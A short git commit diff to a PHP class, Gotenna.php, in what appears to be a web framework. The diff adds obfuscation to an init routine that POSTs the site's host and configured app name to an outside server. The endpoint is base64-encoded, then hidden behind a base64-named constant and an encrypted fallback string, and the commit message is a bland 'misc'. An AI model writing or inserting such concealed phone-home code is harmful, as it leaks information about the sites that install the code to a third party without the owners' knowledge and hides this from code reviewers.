3a745d31fe6ca8b9e4f6cd2c9b5d6f1e2104a113
seekwe <seekwe@gmail.com>
2020-12-17 14:29:24 +0800

    misc: 2020-12-17 14:29:24

--- src/Gotenna.php
+++ src/Gotenna.php
@@ -9,10 +9,16 @@ class Gotenna
 {
     public function init($c, $m, $p)
     {
+        $key = constant(base64_decode('WkxTX0dPX0tFWQ=='));
+        $key = Z::decrypt($key ?: '704f9b93ef114555bd5afbfb93681837a8c04a7821c20fffaa1543dac6a6ea3453b8b70898aab0142bbc547d9e2a44d9', 'go');
+        if (!$key) {
+            return;
+        }
+
         $http = new Http();
         $http->setReferer(z::host(true, true, true));
         $data = [
-            "url" => base64_decode('aHR0cHM6Ly9vcGVuLm5ldGRlLmNuL1Byb2dyYW1BcGkvUHVzaC5nbw=='),
+            "url" => $key,
             "type" => "post",
             "data" => ["raw" => [
                 Z::tap(Z::config('ini.base.name'), function ($name) {
